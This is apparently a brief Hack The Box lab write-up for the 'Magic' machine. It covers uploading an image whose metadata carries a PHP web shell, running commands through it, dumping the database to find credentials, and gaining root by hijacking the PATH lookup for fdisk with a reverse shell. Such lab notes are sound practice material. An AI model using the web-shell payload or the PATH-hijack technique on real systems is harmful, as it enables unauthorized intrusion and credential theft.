# Magic

Author: HTB
Difficulty: 4
Key takeaway: sysinfo runs "fdisk" command (check notes)
Tags: PATH, SQLi
Type: Linux

# Enumeration

- portscan

```bash
ports 22 and 80 were open
```

# Initial Access

- upload.php lets you upload images, add a reverse shell php script as Comment to an image and upload it

```bash
$ exiftool -DocumentName='<h1>reverse<br><?php system($_GET["cmd"]);?></h1>' image.jpeg
```

```bash
http://magic.htb/images/uploads/image.php.jpeg?cmd=id
```

dump the entire database using `mysqldump`

```bash
$ mysqldump --opt --user=username --password database_name > database.sql
```

Found credentials to `theseus` user in database

# Privilege Escalation

**Check notes**

# Notes

- sysinfo runs `fdisk` command as root
    
    create a executable fdisk in /tmp directory and add it to the PATH, and add a reverse shell script and run sysinfo command